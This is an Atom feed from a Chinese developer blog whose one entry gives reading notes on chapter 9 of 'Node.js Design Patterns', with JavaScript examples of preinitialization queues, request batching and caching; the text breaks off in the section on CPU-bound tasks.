<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>七秒悲伤的博客</title>
  
  <subtitle>一个深藏功与名的软件开发爱好者</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://1016990109.github.io/"/>
  <updated>2018-10-06T11:39:05.518Z</updated>
  <id>http://1016990109.github.io/</id>
  
  <author>
    <name>七秒悲伤</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>《Node.js 设计模式》读书笔记 第九章</title>
    <link href="http://1016990109.github.io/2018/10/03/Node-js-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B9%9D%E7%AB%A0/"/>
    <id>http://1016990109.github.io/2018/10/03/Node-js-设计模式读书笔记-第九章/</id>
    <published>2018-10-03T01:07:37.000Z</published>
    <updated>2018-10-06T11:39:05.518Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Advanced-Asynchronous-Recipes-高级异步方法"><a href="#Advanced-Asynchronous-Recipes-高级异步方法" class="headerlink" title="Advanced Asynchronous Recipes(高级异步方法)"></a>Advanced Asynchronous Recipes(高级异步方法)</h1><h2 id="Requiring-aysnchronously-initialized-modules-引入异步初始化的模块"><a href="#Requiring-aysnchronously-initialized-modules-引入异步初始化的模块" class="headerlink" title="Requiring aysnchronously initialized modules(引入异步初始化的模块)"></a>Requiring aysnchronously initialized modules(引入异步初始化的模块)</h2><p>第二章中我们了解到，<code>require</code> 是同步的，是不能异步更改 <code>module.exports</code> 的，所以很多核心模块都包含了同步的 <code>API</code>。但是有时候同步不一定有条件，例如在初始化的过程中需要请求网络获取某些参数，很多数据库、中间件(例如消息队列)等就是这种。</p><a id="more"></a><h3 id="Canonical-solutions-权威方案"><a href="#Canonical-solutions-权威方案" class="headerlink" title="Canonical solutions(权威方案)"></a>Canonical solutions(权威方案)</h3><p>我们举一个例子：一个名为 <code>db</code> 的模块，它将会连接到远程数据库。只有在连接和与服务器的握手完成之后，<code>db</code> 模块才能够接受请求。在这种情况下，我们通常有两种选择：</p><ul><li>在开始使用之前确保模块已经初始化，否则则等待其初始化。每当我们想要在异步模块上调用一个操作时，都必须完成这个过程：</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> db = <span class="built_in">require</span>(<span class="string">'aDb'</span>) <span class="comment">//The async module</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">findAll</span>(<span class="params">type, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (db.connected) &#123;</span><br><span class="line">    <span class="comment">//is it initialized?</span></span><br><span class="line">    runFind()</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    db.once(<span class="string">'connected'</span>, runFind)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">runFind</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    db.findAll(type, callback)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>另外一种就是<strong>依赖注入</strong>：</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 模块app.js</span></span><br><span class="line"><span class="keyword">const</span> db = <span class="built_in">require</span>(<span class="string">'aDb'</span>) <span class="comment">// aDb是一个异步模块</span></span><br><span class="line"><span class="keyword">const</span> findAllFactory = <span class="built_in">require</span>(<span class="string">'./findAll'</span>)</span><br><span class="line">db.on(<span class="string">'connected'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> findAll = findAllFactory(db)</span><br><span class="line">  <span class="comment">// 之后再执行异步操作</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模块findAll.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="params">db</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//db 在这里被初始化</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">findAll</span>(<span class="params">type, callback</span>) </span>&#123;</span><br><span class="line">    db.findAll(type, callback)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一种依赖数量过多时不适用，而第二种会变得比较复杂。</p><h3 id="Preinitialization-queue-预初始化队列"><a href="#Preinitialization-queue-预初始化队列" class="headerlink" title="Preinitialization queue(预初始化队列)"></a>Preinitialization queue(预初始化队列)</h3><p>将模块与依赖项的初始化状态分离的简单模式涉及到使用队列和命令模式。这个想法是保存一个模块在尚未初始化的时候接收到的所有操作，然后在所有初始化步骤完成后立即执行这些操作。</p><h4 id="Implementing-a-module-that-initializes-asynchronously-实现一个异步初始化的模块"><a href="#Implementing-a-module-that-initializes-asynchronously-实现一个异步初始化的模块" class="headerlink" title="Implementing a module that initializes asynchronously(实现一个异步初始化的模块)"></a>Implementing a module that initializes asynchronously(实现一个异步初始化的模块)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> asyncModule = <span class="built_in">module</span>.exports</span><br><span class="line"></span><br><span class="line">asyncModule.initialized = <span class="literal">false</span></span><br><span class="line">asyncModule.initialize = <span class="function"><span class="params">callback</span> =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    asyncModule.initialized = <span class="literal">true</span></span><br><span class="line">    callback()</span><br><span class="line">  &#125;, <span class="number">10000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">asyncModule.tellMeSomething = <span class="function"><span class="params">callback</span> =&gt;</span> &#123;</span><br><span class="line">  process.nextTick(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!asyncModule.initialized) &#123;</span><br><span class="line">      <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"I don't have anything to say right now"</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    callback(<span class="literal">null</span>, <span class="string">'Current time is: '</span> + <span class="keyword">new</span> <span class="built_in">Date</span>())</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用方法时检查是否已经初始化(根据 <code>initialized</code> 变量判断)，未初始化则抛出异常。</p><h4 id="Wrapping-the-module-with-preinitialization-queues-使用预初始化序列包装模块"><a href="#Wrapping-the-module-with-preinitialization-queues-使用预初始化序列包装模块" class="headerlink" title="Wrapping the module with preinitialization queues(使用预初始化序列包装模块)"></a>Wrapping the module with preinitialization queues(使用预初始化序列包装模块)</h4><p>为了维护服务器的鲁棒性，我们现在要通过使用我们在本节开头描述的模式来进行异步模块加载。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//asyncModuleWrapper.js</span></span><br><span class="line"><span class="keyword">const</span> asyncModule = <span class="built_in">require</span>(<span class="string">'./asyncModule'</span>)</span><br><span class="line"><span class="keyword">const</span> asyncModuleWrapper = <span class="built_in">module</span>.exports</span><br><span class="line"></span><br><span class="line"><span class="comment">//存储执行队列，待初始化完成后执行</span></span><br><span class="line"><span class="keyword">let</span> pending = []</span><br><span class="line"><span class="comment">//初始化完成后替换为原模块，不需要再放到执行队列中了，也就是 pending 中</span></span><br><span class="line"><span class="keyword">let</span> initializedState = asyncModule</span><br><span class="line"><span class="comment">//真正的执行体</span></span><br><span class="line"><span class="keyword">let</span> activeState = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当模块没有被初始化时的状态</span></span><br><span class="line"><span class="keyword">let</span> notInitializedState = &#123;</span><br><span class="line">  initialize: <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    asyncModule.initialize(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      asyncModuleWrapper.initalized = <span class="literal">true</span></span><br><span class="line">      activeState = initializedState</span><br><span class="line"></span><br><span class="line">      pending.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">req</span>) </span>&#123;</span><br><span class="line">        asyncModule[req.method].apply(<span class="literal">null</span>, req.args)</span><br><span class="line">      &#125;)</span><br><span class="line">      pending = []</span><br><span class="line"></span><br><span class="line">      callback()</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  tellMeSomething: <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> pending.push(&#123;</span><br><span class="line">      method: <span class="string">'tellMeSomething'</span>,</span><br><span class="line">      args: <span class="built_in">arguments</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">activeState = notInitializedState</span><br><span class="line"></span><br><span class="line">asyncModuleWrapper.initialized = <span class="literal">false</span></span><br><span class="line">asyncModuleWrapper.initialize = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  activeState.initialize.apply(activeState, <span class="built_in">arguments</span>)</span><br><span class="line">&#125;</span><br><span class="line">asyncModuleWrapper.tellMeSomething = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  activeState.tellMeSomething.apply(activeState, <span class="built_in">arguments</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="In-the-wild-其他场景"><a href="#In-the-wild-其他场景" class="headerlink" title="In the wild(其他场景)"></a>In the wild(其他场景)</h4><p>我们刚刚介绍的模式被许多数据库驱动程序和 <code>ORM</code> 库所使用。最值得注意的是 <code>Mongoose</code>，它是 <code>MongoDB</code> 的 <code>ORM</code>。使用 <code>Mongoose</code>，不必等待数据库连接打开，以便能够发送查询，因为每个操作都排队，稍后与数据库的连接完全建立时执行。这显然提高了其 <code>API</code> 的可用性。详情可看 <a href="https://github.com/Automattic/mongoose/blob/21f16c62e2f3230fe616745a40f22b4385a11b11/lib/drivers/node-mongodb-native/collection.js#L103-138" target="_blank" rel="noopener">Mongoose 源码</a>。</p><h2 id="Asynchronous-batching-and-caching-异步批处理和缓存"><a href="#Asynchronous-batching-and-caching-异步批处理和缓存" class="headerlink" title="Asynchronous batching and caching(异步批处理和缓存)"></a>Asynchronous batching and caching(异步批处理和缓存)</h2><h3 id="Implementing-a-server-with-no-caching-or-batching-实现一个没有批处理和缓存的服务器"><a href="#Implementing-a-server-with-no-caching-or-batching-实现一个没有批处理和缓存的服务器" class="headerlink" title="Implementing a server with no caching or batching(实现一个没有批处理和缓存的服务器)"></a>Implementing a server with no caching or batching(实现一个没有批处理和缓存的服务器)</h3><p>考虑一个管理电子商务公司销售的 <code>web</code> 服务器，特别是对于查询我们的服务器所有特定类型的商品交易的总和的情况。为此，考虑到 <code>LevelUP</code> 的简单性和灵活性，我们将再次使用 <code>LevelUP</code>。我们要使用的数据模型是存储在 <code>sales</code> 这一个 <code>sublevel</code> 中的简单事务列表，它是以下的形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transactionId &#123;amount, item&#125;</span><br></pre></td></tr></table></figure><p><code>key</code> 由 <code>transactionId</code> 表示，<code>value</code> 则是一个 <code>JSON</code> 对象，它包含 <code>amount</code>，表示销售金额和 <code>item</code>，表示项目类型。要处理的数据是非常基本的，所以让我们立即在名为的 <code>totalSales.js</code> 文件中实现 <code>API</code>，将如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> level = <span class="built_in">require</span>(<span class="string">'level'</span>)</span><br><span class="line"><span class="keyword">const</span> sublevel = <span class="built_in">require</span>(<span class="string">'level-sublevel'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> db = sublevel(level(<span class="string">'example-db'</span>, &#123; <span class="attr">valueEncoding</span>: <span class="string">'json'</span> &#125;))</span><br><span class="line"><span class="keyword">const</span> salesDb = db.sublevel(<span class="string">'sales'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">totalSales</span>(<span class="params">item, callback</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'totalSales() invoked'</span>)</span><br><span class="line">  <span class="keyword">let</span> sum = <span class="number">0</span></span><br><span class="line">  salesDb</span><br><span class="line">    .createValueStream() <span class="comment">// [1]</span></span><br><span class="line">    .on(<span class="string">'data'</span>, data =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (!item || data.item === item) &#123;</span><br><span class="line">        <span class="comment">// [2]</span></span><br><span class="line">        sum += data.amount</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .on(<span class="string">'end'</span>, () =&gt; &#123;</span><br><span class="line">      callback(<span class="literal">null</span>, sum) <span class="comment">// [3]</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了完成总销售应用程序，我们只需要从 <code>HTTP</code> 服务器公开 <code>totalSales</code> 的 <code>API</code>；所以，下一步是构建一个（<code>app.js</code> 文件）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>)</span><br><span class="line"><span class="keyword">const</span> totalSales = <span class="built_in">require</span>(<span class="string">'./totalSales'</span>)</span><br><span class="line"></span><br><span class="line">http</span><br><span class="line">  .createServer(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> query = url.parse(req.url, <span class="literal">true</span>).query</span><br><span class="line">    totalSales(query.item, (err, sum) =&gt; &#123;</span><br><span class="line">      res.writeHead(<span class="number">200</span>)</span><br><span class="line">      res.end(<span class="string">`Total sales for item <span class="subst">$&#123;query.item&#125;</span> is <span class="subst">$&#123;sum&#125;</span>`</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  .listen(<span class="number">8000</span>, () =&gt; <span class="built_in">console</span>.log(<span class="string">'Started'</span>))</span><br></pre></td></tr></table></figure><h4 id="Asynchronous-request-batching-批量异步处理"><a href="#Asynchronous-request-batching-批量异步处理" class="headerlink" title="Asynchronous request batching(批量异步处理)"></a>Asynchronous request batching(批量异步处理)</h4><p>如果请求相同的异步 <code>API</code> 并且输入相同，那么可以考虑批处理。如果我们在调用异步函数的同时还有另一个正在处理的相同请求，我们可以将这次的回调函数附加到已经运行的操作(也就是异步操作))上，而不是创建一个全新的请求。看下面这张图：</p><p><img src="/assets/img/asynchronous_request_batching.png" alt="asynchronous request batching"></p><p>对两个请求执行到相同的操作。通过这样做，当操作完成时，两个客户端将同时被通知。这代表了一种简单而又非常强大的方式来降低应用程序的负载，而不必处理更复杂的缓存机制，这通常需要适当的内存管理和缓存失效策略。</p><h4 id="Batching-requests-in-the-total-sales-web-server-在销售总量-web-服务器中批量处理请求"><a href="#Batching-requests-in-the-total-sales-web-server-在销售总量-web-服务器中批量处理请求" class="headerlink" title="Batching requests in the total sales web server(在销售总量 web 服务器中批量处理请求)"></a>Batching requests in the total sales web server(在销售总量 web 服务器中批量处理请求)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> totalSales = <span class="built_in">require</span>(<span class="string">'./totalSales'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> queues = &#123;&#125;</span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">totalSalesBatch</span>(<span class="params">item, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (queues[item]) &#123;</span><br><span class="line">    <span class="comment">// [1]</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Batching operation'</span>)</span><br><span class="line">    <span class="keyword">return</span> queues[item].push(callback)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  queues[item] = [callback] <span class="comment">// [2]</span></span><br><span class="line">  totalSales(item, (err, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> queue = queues[item] <span class="comment">// [3]</span></span><br><span class="line">    queues[item] = <span class="literal">null</span></span><br><span class="line">    queue.forEach(<span class="function"><span class="params">cb</span> =&gt;</span> cb(err, res))</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>如果请求的 <code>item</code> 已经存在队列中，则意味着该特定 <code>item</code> 的请求已经在服务器任务队列中。在这种情况下，我们所要做的只是将回调 <code>push</code> 到现有队列，并立即从调用中返回。不进行后续操作。</li><li>如果请求的 <code>item</code> 没有在队列中，这意味着我们必须创建一个新的请求。为此，我们为该特定 <code>item</code> 的请求创建一个新队列，并使用当前回调函数对其进行初始化。接下来，我们调用原始的 <code>totalSales()</code> <code>API</code>。</li><li>当原始的 <code>totalSales()</code> 请求完成时，则执行我们的回调函数，我们遍历队列中为该特定请求的 <code>item</code> 添加的所有回调，并分别调用这些回调函数。</li></ol><h3 id="Asynchronous-request-caching-异步请求缓存"><a href="#Asynchronous-request-caching-异步请求缓存" class="headerlink" title="Asynchronous request caching(异步请求缓存)"></a>Asynchronous request caching(异步请求缓存)</h3><p>对于一个有经验的开发人员来说，缓存不应该是多么新的技术，但是异步编程中这种模式的不同之处在于它应该与批处理结合在一起，以达到最佳效果。原因是因为多个请求可能并发运行，而没有设置缓存，并且当这些请求完成时，缓存将会被设置多次，这样做则会造成缓存资源的浪费。</p><p>基于这些假设，异步请求缓存模式的最终结构如下图所示：</p><p><img src="/assets/img/asynchronous_request_caching.png" alt="asynchronous request caching"></p><p>上图给出了最佳异步缓存算法的两个步骤：</p><ol><li>与批处理模式完全相同，与在未设置高速缓存时接收到的任何请求将一起批处理。这些请求完成时，缓存将会被设置一次。</li><li>当缓存最终被设置时，任何后续的请求都将直接从缓存中提供。</li></ol><h4 id="Caching-requests-in-the-total-sales-web-server-在销售总量-web-服务器中缓存请求"><a href="#Caching-requests-in-the-total-sales-web-server-在销售总量-web-服务器中缓存请求" class="headerlink" title="Caching requests in the total sales web server(在销售总量 web 服务器中缓存请求)"></a>Caching requests in the total sales web server(在销售总量 web 服务器中缓存请求)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//totalSalesCache.js</span></span><br><span class="line"><span class="keyword">const</span> totalSales = <span class="built_in">require</span>(<span class="string">'./totalSales'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> queues = &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> cache = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">totalSalesBatch</span>(<span class="params">item, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> cached = cache[item]</span><br><span class="line">  <span class="keyword">if</span> (cached) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Cache hit'</span>)</span><br><span class="line">    <span class="comment">//注意还是需要异步返回，缓存可能是异步设定的，这样保证一定能取到缓存</span></span><br><span class="line">    <span class="keyword">return</span> process.nextTick(callback.bind(<span class="literal">null</span>, <span class="literal">null</span>, cached))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queues[item]) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Batching operation'</span>)</span><br><span class="line">    <span class="keyword">return</span> queues[item].push(callback)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  queues[item] = [callback]</span><br><span class="line">  totalSales(item, (err, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (!err) &#123;</span><br><span class="line">      cache[item] = res</span><br><span class="line">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> cache[item]</span><br><span class="line">      &#125;, <span class="number">30</span> * <span class="number">1000</span>) <span class="comment">//30 seconds expiry</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> queue = queues[item]</span><br><span class="line">    queues[item] = <span class="literal">null</span></span><br><span class="line">    queue.forEach(<span class="function"><span class="params">cb</span> =&gt;</span> cb(err, res))</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Notes-about-implementing-caching-mechanisms-有关缓存实现机制的说明"><a href="#Notes-about-implementing-caching-mechanisms-有关缓存实现机制的说明" class="headerlink" title="Notes about implementing caching mechanisms(有关缓存实现机制的说明)"></a>Notes about implementing caching mechanisms(有关缓存实现机制的说明)</h4><p>我们必须记住，在实际应用中，我们可能想要使用更先进的失效技术和存储机制。 这可能是必要的，原因如下：</p><ol><li>大量的缓存值可能会消耗大量内存。 在这种情况下，可以应用 <code>Least Recently Used</code>（<code>LRU</code>）算法来保持恒定的存储器利用率。</li><li>当应用程序分布在多个进程中时，对缓存使用简单变量可能会导致每个服务器实例返回不同的结果。如果这对于我们正在实现的特定应用程序来说是不希望的，那么解决方案就是使用共享存储来存储缓存。 常用的解决方案是 <code>Redis</code>(<a href="http://redis.io" target="_blank" rel="noopener">http://redis.io</a>) 和 <code>Memcached</code>(<a href="http://memcached.org" target="_blank" rel="noopener">http://memcached.org</a>)。</li><li>与定时淘汰缓存相比，手动淘汰高速缓存可使得高速缓存使用寿命更长，同时提供更新的数据，但当然，管理起缓存来要复杂得多。</li></ol><h3 id="Batching-and-caching-with-promises-使用-Promise-来批处理和缓存"><a href="#Batching-and-caching-with-promises-使用-Promise-来批处理和缓存" class="headerlink" title="Batching and caching with promises(使用 Promise 来批处理和缓存)"></a>Batching and caching with promises(使用 Promise 来批处理和缓存)</h3><p>利用 <code>Promise</code> 进行异步批处理和缓存策略，有如下两个优点：</p><ul><li>多个 <code>then()</code> 监听器可以附加到相同的 <code>Promise</code> 实例。</li><li><code>then()</code> 监听器最多保证被调用一次，即使在 <code>Promise</code> 已经被 <code>resolve</code> 了之后，<code>then()</code> 也能正常工作。此外，<code>then()</code> 总是会被保证其是异步调用的。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pify = <span class="built_in">require</span>(<span class="string">'pify'</span>)</span><br><span class="line"><span class="keyword">const</span> totalSales = pify(<span class="built_in">require</span>(<span class="string">'./totalSales'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cache = &#123;&#125;</span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">totalSalesPromises</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (cache[item]) &#123;</span><br><span class="line">    <span class="keyword">return</span> cache[item]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cache[item] = totalSales(item)</span><br><span class="line">    .then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> cache[item]</span><br><span class="line">      &#125;, <span class="number">30</span> * <span class="number">1000</span>) <span class="comment">//30 seconds expiry</span></span><br><span class="line">      <span class="keyword">return</span> res</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">delete</span> cache[item]</span><br><span class="line">      <span class="keyword">throw</span> err</span><br><span class="line">    &#125;)</span><br><span class="line">  <span class="keyword">return</span> cache[item]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Running-CPU-bound-tasks-运行-CPU-密集型任务"><a href="#Running-CPU-bound-tasks-运行-CPU-密集型任务" class="headerlink" title="Running CPU-bound tasks(运行 CPU 密集型任务)"></a>Running CPU-bound tasks(运行 CPU 密集型任务)</h2><p>当我们运行一个长时间的同步任务时，<code>Node.js</code> 会一直处于阻塞的状态，控制权不会还给事件循环，那么就无法处理多个请求了。</p><h3 id="使用-setIntermediate"><a href="#使用-setIntermediate" class="headerlink" title="使用 setIntermediate"></a>使用 setIntermediate</h3><p>通常，<code>CPU-bound</code> 算法是建立在一定规则之上的。它可以是一组递归调用，一个循环，或者基于这些的任何变化/组合。所以，对于我们的问题，一个简单的解决方案就是在这些步骤完成后（或者在一定数量的步骤之后），将控制权交还给事件循环。这样，任何待处理的 <code>I/O</code> 仍然可以在事件循环在长时间运行的算法产生 <code>CPU</code> 的时间间隔中处理。对于这个问题而言，解决这一问题的方式是把算法的下一步在任何可能导致挂起的 <code>I/O</code> 请求之后运行。</p><p>最简单的方法就是使用 <code>setIntermediate</code> 来将控制权还给事件循环。</p><p><strong>交错模式</strong></p><p>正如我们所看到的，在保持应用程序的响应性的同时运行一个 <code>CPU-bound</code> 的任务并不复杂，只需要使用 <code>setImmediate()</code> 